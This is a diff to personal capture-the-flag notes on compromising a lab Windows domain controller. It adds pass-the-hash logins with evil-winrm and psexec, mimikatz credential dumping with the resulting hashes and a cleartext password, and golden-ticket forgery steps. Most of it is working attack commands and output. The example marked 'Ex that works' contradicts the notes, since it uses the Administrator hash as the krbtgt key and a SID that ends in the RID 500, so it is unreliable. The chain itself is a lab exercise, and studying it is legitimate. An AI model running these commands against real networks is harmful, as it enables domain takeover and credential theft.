@@ -3,7 +3,8 @@ he DC is found to allow anonymous LDAP binds, which is used to enumerate domain 
 Kerberos pre-authentication disabled can be cracked to gain a foothold. 
 The service account is found to be a member of the Account Operators group, which can be used to add users to privileged Exchange groups.
 SMB File Share + Winpeas
-The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes. 
+The Exchange group membership is leveraged to gain DCSync privileges on the domain and dump the NTLM hashes.
+Compromise Full DOmain + Golden Ticket Attack = Mimikatz or ticketer.py
 #########
 
 1-Enumeration:
@@ -364,9 +365,79 @@ The Exchange group membership is leveraged to gain DCSync privileges on the doma
         We will use the Administrator Hash via psexec:
             /usr/share/doc/python3-impacket/examples/psexec.py -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
 
+        We can also use evil-winrm:
+            evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+
     On Windows:
         C:\Windows\system32> whoami
-            nt authority\system
+        nt authority\system
+
+        We can going further by installing mimikatz in the 'Downloads' folders 
+
+        powershell -ep bypass ./mimikatz.exe
+        mimikatz# privilege::debug 
+                  sekurlsa::logonPasswords
+
+                We get Admin passwd in clear:
+                    	User Name         : Administrator
+                        Domain            : HTB
+                        Logon Server      : FOREST
+                        SID               : S-1-5-21-3072663084-364016917-1341370565-500
+                            * Username : Administrator
+                            * Domain   : HTB
+                            * NTLM     : 32693b11e6aa90eb43d32c72a07ceea6
+                            * SHA1     : ce6ffc963b8fc2e5e28dcd66d02250718dc43078
+                            * DPAPI    : de9e86927c6a458e41d1b6b946ebf2d0
+                            * Username : Administrator
+                            * Domain   : htb.local
+                            * Password : XGtwdhfjk79bx3xN
+        
+                    lsadump::lsa /patch
+                        RID  : 000001f4 (500)
+                        User : Administrator
+                        LM   : 
+                        NTLM : 32693b11e6aa90eb43d32c72a07ceea6
+
+
+                        RID  : 000001f6 (502)
+                        User : krbtgt
+                        LM   : 
+                        NTLM : 819af826bb148e603acb0f33d17632f8
+
+        Compromise All the domain - GOLDEN TICKET ATTACK:
+            -https://stridergearhead.medium.com/ad-attacks-with-mimikatz-d907efb76f52
+            -https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket
+
+            If we have a Golden Ticket then we can get access to the entire domain.
+                We will use mimikatz.
+
+                    First Command: privilege::debug
+
+                Now we will dump LSA of krbtgt
+                    Command: lsadump::lsa /inject /name:krbtgt
+
+                Now we have successfully dumped.
+
+                To generate the golden ticket, we need SID, Hash NTLM
+                    Command: kerberos::golden /User:Administrator(not real user) /domain:<domain name> /sid:<SID> /krbtgt:<NTLM hash> /id:500 /ptt
+
+                Here id 500 is the RID of Administrator.
+
+                ptt stands for Pass The Ticket.
+
+            Ex that works:
+                kerberos::golden /User:Administrator /domain:htb.local /sid:S-1-5-21-3072663084-364016917-1341370565-500 /krbtgt:32693b11e6aa90eb43d32c72a07ceea6 /id:500 /ptt
+            Golden ticket for 'Administrator @ htb.local' successfully submitted for current session
+
+
+    Now we will use the Command: 
+
+        -misc::cmd
+
+            This will open the cmd where we can utilize the session and the golden ticket.
+            Now we have access all over the Domain.
+
+
 
             
         
